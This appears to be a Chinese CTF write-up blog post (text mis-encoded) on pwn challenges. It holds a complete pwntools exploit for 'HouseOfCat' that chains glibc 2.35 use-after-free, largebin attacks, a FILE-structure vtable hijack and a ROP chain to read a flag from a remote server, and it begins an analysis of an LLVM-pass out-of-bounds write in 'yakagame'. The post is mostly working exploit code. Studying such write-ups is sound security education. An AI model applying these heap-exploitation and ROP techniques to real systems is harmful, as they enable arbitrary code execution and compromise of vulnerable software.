    <content type="html"><![CDATA[<p>18 é“ pwn ï¼ŒæŠŠ ğŸ‘´ ç»™å†²çƒ‚äº†ï¼Œç»™ ğŸ‘´ å¸¦æ¥äº†å·¨å¤§çš„å¿ƒçµéœ‡æ’¼ä¸é˜´å½±ã€‚ğŸ‘´ æ¯”è¾ƒèœï¼Œæ¯”èµ›æ—¶ä¹Ÿå°±å‡ºäº†æ¯”è¾ƒç®€å•çš„ä¸‰é“ï¼Œå…¶ä»–çš„ ğŸ‘´ æ˜¯çœŸçš„ä¸ä¼šï¼ŒğŸ‘´ ä¸‹å»å¥½å¥½åæ€ã€‚</p><h3 id="HouseOfCat"><a class="header-anchor" href="#HouseOfCat">Â¶</a>HouseOfCat</h3><h4 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h4><p>ä¸€è¡€é¢˜ï¼Œå¥—äº†IOTæ¿å­çš„ 2.35 ç‰ˆæœ¬ä¸‹ <strong>UAF</strong> åˆ©ç”¨ã€‚</p><p><strong>æ ¸å¿ƒæ€è·¯</strong>ï¼šåœ¨è°ƒç”¨<code>_wide_vtable</code>é‡Œé¢çš„æˆå‘˜å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œ<strong>æ²¡æœ‰å…³äºvtableçš„åˆæ³•æ€§æ£€æŸ¥</strong>ã€‚</p><p>ä¸€æ¬¡ Largebin æ‰“ stderrï¼Œä¸€æ¬¡ Largebin æ‰“ main_arena Topchunk åœ°å€ï¼Œèµ° kiwi è§¦å‘ IO æµåˆ©ç”¨ <code>_wide_data</code> æˆå‘˜æ§åˆ¶æ‰§è¡Œæµå®Œæˆ orwã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ Edit æä¾›çš„å†™å…¥å­—èŠ‚æ•°æ˜æ˜¾ä¸è¶³ï¼Œéœ€è¦åœ¨ Add æ—¶æå‰å¸ƒç½®å¥½ payloadã€‚</p><h4 id="Exp"><a class="header-anchor" href="#Exp">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">IO_FILE</span>(<span class="hljs-params">_flags = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_ptr = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_ptr = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_buf_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_buf_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_save_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_backup_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_save_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_marker = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_chain = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _fileno = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _lock = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _wide_data = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _mode = <span class="hljs-number">0</span></span>):<br>    fake_IO_FILE = p32(_flags) + \<br>             p32(<span class="hljs-number">0</span>) + \<br>             p64(_IO_read_ptr) + \<br>             p64(_IO_read_end) + \<br>             p64(_IO_read_base) + \<br>             p64(_IO_write_base) + \<br>             p64(_IO_write_ptr) + \<br>             p64(_IO_write_end) + \<br>             p64(_IO_buf_base) + \<br>             p64(_IO_buf_end) + \<br>             p64(_IO_save_base) + \<br>             p64(_IO_backup_base) + \<br>             p64(_IO_save_end) + \<br>             p64(_IO_marker) + \<br>             p64(_IO_chain) + \<br>             p32(_fileno)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_lock)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_wide_data)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_mode)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">return</span> fake_IO_FILE<br><br>elf = ELF(<span class="hljs-string">&#x27;./house_of_cat&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./house_of_cat&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;59.110.212.61&#x27;</span>,<span class="hljs-number">16938</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;&#x27;LOGIN \x7C r00t QWB QWXFadmin\0&#x27;&#x27;&#x27;</span><br>    sla(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,<span class="hljs-built_in">str</span>(msg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;&#x27;CAT  \x7C r00t QWB QWXF&#x27;&#x27;&#x27;</span>+p32(<span class="hljs-number">0x0FFFFFFFF</span>)+<span class="hljs-string">&#x27;$&#x27;</span><br>    sla(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,<span class="hljs-built_in">str</span>(msg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br>login()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x458</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x468</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>rdi2rdx = libc_base + <span class="hljs-number">0x1675b0</span><br>dele(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Context:\n&#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = heap_leak - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">3</span>)<br>stderr = <span class="hljs-number">0x21a860</span> + libc_base<br>_IO_wfile_jumps = <span class="hljs-number">0x2160c0</span> + libc_base<br>rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002be51</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x000000000011f497</span><br>jmp_rsi = libc_base + <span class="hljs-number">0x000000000003d3cf</span><br>ret = libc_base + <span class="hljs-number">0x0000000000029cd6</span><br>rax = libc_base + <span class="hljs-number">0x0000000000045eb0</span><span class="hljs-comment"># 0x0000000000045eb0 : pop rax ; ret</span><br>addr =heap_base<br>rdi_rdx = libc_base + <span class="hljs-number">0x1675b0</span><br>syscall_ret = libc_base + <span class="hljs-number">0x0000000000091396</span> <span class="hljs-comment"># 0x0000000000091396: syscall; ret; </span><br><br>orw = flat([<br>    <span class="hljs-number">0</span>,rdi,<span class="hljs-number">0</span>,libc.sym.close,rax,<span class="hljs-number">2</span>,rdi,heap_base+<span class="hljs-number">0x2b0</span>,rsi,<span class="hljs-number">0</span>,syscall_ret,rdi,<span class="hljs-number">0</span>,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,rsi,heap_base+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x20</span>,libc.sym.read,rdi,<span class="hljs-number">1</span>,libc.sym.write<br>])+<span class="hljs-string">&#x27;/flag\0\0\0&#x27;</span><br>addr = heap_base+<span class="hljs-number">0x200</span><br>fuck = SigreturnFrame()<br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = addr<br>fuck.rdx = <span class="hljs-number">0x300</span><br>fuck.rsp = addr + <span class="hljs-number">8</span><br>fuck.rip = libc.sym.read<br>guard = libc_base - <span class="hljs-number">0x2890</span><br>_IO_wstrn_jumps = libc_base + <span class="hljs-number">0x215dc0</span> - <span class="hljs-number">0x38</span> + <span class="hljs-number">24</span><br>_IO_cookie_jumps = libc_base +<span class="hljs-number">0x215b80</span> - <span class="hljs-number">0x38</span> + <span class="hljs-number">24</span><br>lg(<span class="hljs-string">&#x27;guard&#x27;</span>,guard)<br>payload = IO_FILE(_IO_read_end=<span class="hljs-number">1</span>,_IO_write_ptr=stderr-<span class="hljs-number">0x20</span>,_lock=heap_base+<span class="hljs-number">0x10</span>,_IO_chain=heap_base+<span class="hljs-number">0x3a0</span>,_wide_data=heap_base+<span class="hljs-number">0xc40</span>)[<span class="hljs-number">0x10</span>:]+p64(_IO_wfile_jumps)<br>payload = payload.ljust(<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>payload += <span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">0xe0</span>]+p64(heap_base+<span class="hljs-number">0xd40</span>-<span class="hljs-number">0x68</span>)<br>payload = payload.ljust(<span class="hljs-number">0x1f0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>) + p64(magic)<br><br><br><span class="hljs-comment"># payload += IO_FILE(_IO_write_ptr=0xffffffffffffffff,_IO_chain=0,_lock=0) + p64(_IO_cookie_jumps + 0x60) + p64(heap_base+0x4a0) + p64(0) + p64(rol(rdi_rdx ^ (heap_base+0x390), 0x11,64))</span><br><span class="hljs-comment"># payload = payload.ljust(0x1f0,&#x27;\0&#x27;)</span><br><span class="hljs-comment"># payload += p64(0)+p64(heap_base+0x4a0)+p64(0)*2+p64(magic)+str(fuck)[0x28:]</span><br><span class="hljs-comment"># payload = payload.ljust(0x2f0,&#x27;\0&#x27;)</span><br><span class="hljs-comment"># payload += mmp</span><br><br>fake1 = libc_base + <span class="hljs-number">0x21a0e0</span><br>fake2 = heap_base + <span class="hljs-number">0x290</span><br><span class="hljs-comment"># add(4,0x458,&#x27;u&#x27;*0x20+payload[0x20:])</span><br><span class="hljs-comment"># add(5,0x458)</span><br><span class="hljs-comment"># add(6,0x448)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># add(7,0x468)</span><br><span class="hljs-comment"># dele(6)</span><br><span class="hljs-comment"># edit(4,p64(fake1)*2 + p64(fake2) + p64(stderr-0x20))</span><br><span class="hljs-comment"># add(8,0x420)</span><br><br><span class="hljs-comment"># dele(8)</span><br><span class="hljs-comment"># edit(4,p64(fake1)*2 + p64(fake2) + p64(0x7ffff7fa5ce0-0x20))</span><br><span class="hljs-comment"># add(9,0x420)</span><br><span class="hljs-comment"># add(10,0x468)</span><br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x458</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x450</span>+pack(-<span class="hljs-number">2059</span>))<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x458</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x20</span>+payload[<span class="hljs-number">0x20</span>:])<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">6</span>,p64(fake1)*<span class="hljs-number">2</span> + p64(fake2) + p64(stderr-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x420</span>)<br><br>dele(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">6</span>,p64(fake1)*<span class="hljs-number">2</span> + p64(fake2) + p64(libc_base+<span class="hljs-number">0x219ce0</span>-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x420</span>)<br><span class="hljs-comment"># add(11,0x468)</span><br>cat()<br>menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">11</span>))<br>sla(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x468</span>))<br><br>sleep(<span class="hljs-number">2</span>)<br>sl(orw)<br><br><span class="hljs-comment"># dele(9)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># dele(5)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># add(10,0x458)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x7ffff7e011c8</span><br><span class="hljs-string">   0x7ffff7e011b4 &lt;__vfprintf_internal+260&gt;    cmp    rdi, rax</span><br><span class="hljs-string">   0x7ffff7e011b7 &lt;__vfprintf_internal+263&gt;    jbe    __vfprintf_internal+6560                &lt;__vfprintf_internal+6560&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e011bd &lt;__vfprintf_internal+269&gt;    mov    rsi, qword ptr [rsp + 8]</span><br><span class="hljs-string">   0x7ffff7e011c2 &lt;__vfprintf_internal+274&gt;    mov    rdx, rbx</span><br><span class="hljs-string">   0x7ffff7e011c5 &lt;__vfprintf_internal+277&gt;    mov    rdi, rbp</span><br><span class="hljs-string"> â–º 0x7ffff7e011c8 &lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]        &lt;0&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e011cd &lt;__vfprintf_internal+285&gt;    cmp    rbx, rax</span><br><span class="hljs-string">   0x7ffff7e011d0 &lt;__vfprintf_internal+288&gt;    jne    __vfprintf_internal+5880                &lt;__vfprintf_internal+5880&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="yakagame"><a class="header-anchor" href="#yakagame">Â¶</a>yakagame</h3><p>Exp æœ‰æ¦‚ç‡å¤±è´¥ï¼Œä½†æˆåŠŸç‡å¾ˆé«˜ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731085710766.png" alt="exp"></p><h4 id="åˆ†æ-v2"><a class="header-anchor" href="#åˆ†æ-v2">Â¶</a>åˆ†æ</h4><p>ç»å…¸çš„ llvm pass pwn é¢˜ï¼Œè›‹ç–¼çš„æ˜¯ç»™å‡ºæ¥çš„å‡ ä¸ªå‡½æ•°éƒ½æ²¡ç”¨ï¼Œåœ¨ä¸Šé¢æµªè´¹äº†å¤ªå¤šçš„æ—¶é—´äº†ã€‚</p><p>å…³é”®å‡½æ•°:</p><p>1.åé—¨å‡½æ•°ï¼Œè¦æ±‚score&gt;0x12345678</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090206313.png" alt="yakagame1"></p><p>è¿›å…¥åä¼šæ‰§è¡Œ cmd æŒ‡é’ˆå†…å­˜æ”¾çš„å†…å®¹ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090304553.png" alt="yakagame2"></p><p>2.ä¸‹æ ‡è¶Šç•Œ</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090050060.png" alt="yakagame3"></p><p>å…¶ä¸­ï¼Œ<strong>v33 ä¸º char ç±»å‹</strong> ï¼Œåœ¨å‡½æ•°æ•°é‡è¶³å¤Ÿå¤šæ—¶å¯ä»¥éå†åˆ°<strong>è´Ÿæ•°</strong>ä¸‹æ ‡ï¼Œæ„æˆè¶Šç•Œå†™ã€‚</p><p>æ€è·¯ï¼š</p><ol><li>é¦–å…ˆéœ€è¦èƒ½å¤Ÿè¿›å…¥åé—¨å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å¯æ§èŒƒå›´å†…æ‰¾åˆ°ä¸€ä¸ªå†…å®¹ &gt; 0x12345678 çš„åœ°å€ï¼Œè¿™é‡Œæˆ‘é€‰çš„æ˜¯ <code>stdout@got + 2</code> ï¼Œ0x7f å¼€å¤´çš„ 8 ä¸ªå­—èŠ‚å¯ä»¥ä¿è¯è¿›å…¥åé—¨å‡½æ•°ï¼Œåˆ©ç”¨è¶Šç•Œå†™æ§åˆ¶ä¸‹æ ‡è¦†å†™ score æŒ‡é’ˆã€‚</li><li>å…¶æ¬¡éœ€è¦æ§åˆ¶ cmd çš„å†…å®¹ï¼Œç†æƒ³çŠ¶æ€åº”è¯¥é€‰å– <code>/bin/sh\0</code> ï¼Œä½†æˆ‘æ²¡èƒ½åœ¨å›ºå®šåœ°å€æ‰¾åˆ°ï¼Œå°±é€‰å–äº† <code>sh\0</code>ï¼Œæœ€ç»ˆä¹ŸæˆåŠŸå®Œæˆäº†åˆ©ç”¨ã€‚</li></ol><h4 id="exp-c"><a class="header-anchor" href="#exp-c">Â¶</a>exp.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 